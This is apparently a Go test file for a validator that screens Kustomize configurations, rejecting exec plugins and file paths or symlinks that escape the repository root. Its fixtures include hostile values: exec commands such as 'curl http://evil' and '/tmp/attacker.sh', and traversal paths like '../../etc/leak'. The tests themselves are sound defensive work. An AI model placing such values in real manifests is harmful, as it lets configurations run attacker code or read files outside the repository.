package netsec

import "testing"

func TestExecPluginsRejected(t *testing.T) {
	admitter := NewAdmitter(testCatalog(t, nil), nil)

	t.Run("inline exec field rejected", func(t *testing.T) {
		entry := PluginEntry{
			Spec: map[string]any{
				"apiVersion": "example.com/v1",
				"kind":       "SecretsFromVault",
				"exec": map[string]any{
					"command": "/tmp/attacker.sh",
				},
			},
		}
		entry.RawSpec = mustJSON(t, entry.Spec)
		err := admitter.Validate(&Kustomization{Generators: []PluginEntry{entry}})
		assertViolation(t, err, ReasonExecPlugin)
	})

	t.Run("krm function exec annotation map rejected", func(t *testing.T) {
		entry := PluginEntry{
			Spec: map[string]any{
				"apiVersion": "v1",
				"kind":       "ConfigMap",
				"metadata": map[string]any{
					"annotations": map[string]any{
						krmFunctionAnnotation: map[string]any{
							"exec": map[string]any{"path": "curl http://evil"},
						},
					},
				},
			},
		}
		entry.RawSpec = mustJSON(t, entry.Spec)
		err := admitter.Validate(&Kustomization{Transformers: []PluginEntry{entry}})
		assertViolation(t, err, ReasonExecPlugin)
	})

	t.Run("string annotation form rejected", func(t *testing.T) {
		entry := PluginEntry{
			Spec: map[string]any{
				"metadata": map[string]any{
					"annotations": map[string]any{
						krmFunctionAnnotation: "exec: /tmp/pwn",
					},
				},
			},
		}
		entry.RawSpec = mustJSON(t, entry.Spec)
		err := admitter.Validate(&Kustomization{Generators: []PluginEntry{entry}})
		assertViolation(t, err, ReasonExecPlugin)
	})

	t.Run("empty exec value is not treated as an exec plugin", func(t *testing.T) {
		entry := PluginEntry{
			Spec: map[string]any{
				"apiVersion": "builtin",
				"kind":       "ConfigMapGenerator",
				"exec":       nil,
			},
		}
		entry.RawSpec = mustJSON(t, entry.Spec)
		err := admitter.Validate(&Kustomization{Generators: []PluginEntry{entry}})
		assertAllowed(t, err)
	})

	t.Run("benign inline generator allowed", func(t *testing.T) {
		entry := PluginEntry{
			Spec: map[string]any{
				"apiVersion": "builtin",
				"kind":       "ConfigMapGenerator",
			},
		}
		entry.RawSpec = mustJSON(t, entry.Spec)
		err := admitter.Validate(&Kustomization{Generators: []PluginEntry{entry}})
		assertAllowed(t, err)
	})

	t.Run("path generator with traversal rejected", func(t *testing.T) {
		err := admitter.Validate(&Kustomization{
			Generators: []PluginEntry{{Path: "../plugin.yaml"}},
		})
		assertViolation(t, err, ReasonPathEscapesRoot)
	})
}

func TestConfigMapGeneratorFiles(t *testing.T) {
	files := []FileInfo{
		{RepoPath: "config/app.properties"},
		{RepoPath: "config/leak", IsSymlink: true, LinkTarget: "../../etc/leak"},
	}
	admitter := NewAdmitter(testCatalog(t, files), nil)

	t.Run("scoped files and env allowed", func(t *testing.T) {
		err := admitter.Validate(&Kustomization{
			ConfigMapGenerators: []GeneratorArgs{{
				Name:  "settings",
				Env:   "config/app.properties",
				Files: []string{"app.properties=config/app.properties"},
			}},
		})
		assertAllowed(t, err)
	})

	t.Run("escaping file rejected", func(t *testing.T) {
		err := admitter.Validate(&Kustomization{
			ConfigMapGenerators: []GeneratorArgs{{
				Name:  "settings",
				Files: []string{"../outside.properties"},
			}},
		})
		assertViolation(t, err, ReasonPathEscapesRoot)
	})

	t.Run("symlink escaping file rejected", func(t *testing.T) {
		err := admitter.Validate(&Kustomization{
			ConfigMapGenerators: []GeneratorArgs{{
				Name:  "settings",
				Files: []string{"config/leak"},
			}},
		})
		assertViolation(t, err, ReasonSymlinkEscapesRoot)
	})

	t.Run("secret generator receives same treatment", func(t *testing.T) {
		err := admitter.Validate(&Kustomization{
			SecretGenerators: []GeneratorArgs{{
				Name:  "creds",
				Files: []string{"../leak.txt"},
			}},
		})
		assertViolation(t, err, ReasonPathEscapesRoot)
	})
}
